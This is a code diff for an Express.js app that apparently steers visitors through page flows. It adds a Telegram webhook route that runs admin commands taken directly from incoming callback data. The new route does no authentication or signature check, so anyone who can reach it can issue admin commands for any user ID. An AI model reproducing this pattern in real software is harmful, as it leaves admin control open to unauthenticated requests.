@@ -1,7 +1,7 @@
 import express from "express";
 import geoip from "geoip-lite";
 import session from "express-session";
-import { buildMessage, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow } from "../utils.js";
+import { buildMessage, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, handleAdminCommand, sendAPIRequest, requireAdmin, routeMap, getPageFlow, savePageFlow } from "../utils.js";
 import capRouter, { requireCap } from "../altcheck.js";
 import dotenv from "dotenv";
 import bcrypt from "bcrypt";
@@ -499,6 +499,23 @@ router.post("/deleteuser", async (req, res) => {
   }
 });
 
+router.post("/telegram-webhook", async (req, res) => {
+  const data = req.body; 
+
+  if (data.callback_query) {
+    const [_, command, userId] = data.callback_query.data.split(":");
+
+    // Call your shared admin command logic
+    handleAdminCommand({ userId, command });
+
+    // Answer callback to remove "loading…" in Telegram
+    await sendMessageFor(data.callback_query.from.id, "✅ Command sent!");
+
+    res.sendStatus(200);
+  } else {
+    res.sendStatus(200);
+  }
+});
 
   return router;
 }
